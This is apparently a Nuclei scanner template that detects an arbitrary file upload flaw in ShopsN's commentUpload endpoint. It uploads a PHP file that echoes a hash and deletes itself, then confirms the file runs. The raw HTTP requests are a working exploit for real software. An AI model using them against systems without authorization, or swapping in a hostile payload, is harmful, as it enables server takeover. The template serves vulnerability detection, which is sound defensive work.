id: shopsn-commentupload-file-upload
info:
  name: ShopsN CommentUpload Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    ShopsN is an open-source online store system. It contains an arbitrary file upload vulnerability in the commentUpload functionality, allowing attackers to upload malicious files and gain server privileges.
  reference:
    - https://chybeta.github.io/2018/03/21/%E6%9F%90%E5%95%86%E5%9F%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more

variables:
  random_file: "{{rand_base(8)}}.php"
  file_content: "<?php echo md5(233); unlink(__FILE__); ?>"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    raw:
      - |
        POST /index.php/Home/AppUpload/commentUpload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqfmeYTXFKSA3F97e

        ------WebKitFormBoundaryqfmeYTXFKSA3F97e
        Content-Disposition: form-data; name="img"; filename="{{random_file}}"
        Content-Type: text/php

        {{file_content}}
        ------WebKitFormBoundaryqfmeYTXFKSA3F97e
        Content-Disposition: form-data; name="submit"

        Submit
        ------WebKitFormBoundaryqfmeYTXFKSA3F97e--
    matchers:
      - type: status
        status:
          - 200

  - id: verify-upload
    raw:
      - |
        GET /Uploads/show/{{random_file}} HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "e165421110ba03099a1c0393373c5b43"
